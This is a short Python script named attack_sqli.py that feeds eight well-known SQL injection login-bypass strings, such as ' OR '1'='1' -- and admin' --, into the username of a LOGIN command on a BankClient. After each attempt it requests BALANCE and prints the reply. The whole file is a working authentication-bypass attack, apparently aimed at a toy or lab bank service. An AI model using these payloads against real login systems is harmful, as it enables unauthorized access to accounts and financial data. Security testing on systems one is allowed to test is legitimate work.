# attack_sqli.py
from bank_client import BankClient

PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "admin' --",
    "admin'/*",
    "' OR 'x'='x",
    "' OR ''='",
    "') OR ('1'='1",
]

for p in PAYLOADS:
    c = BankClient()
    reply = c.cmd(f"LOGIN {p} x")
    bal = c.cmd("BALANCE")
    print(f"payload={p!r:35} -> {reply}   {bal}")
    c.close()
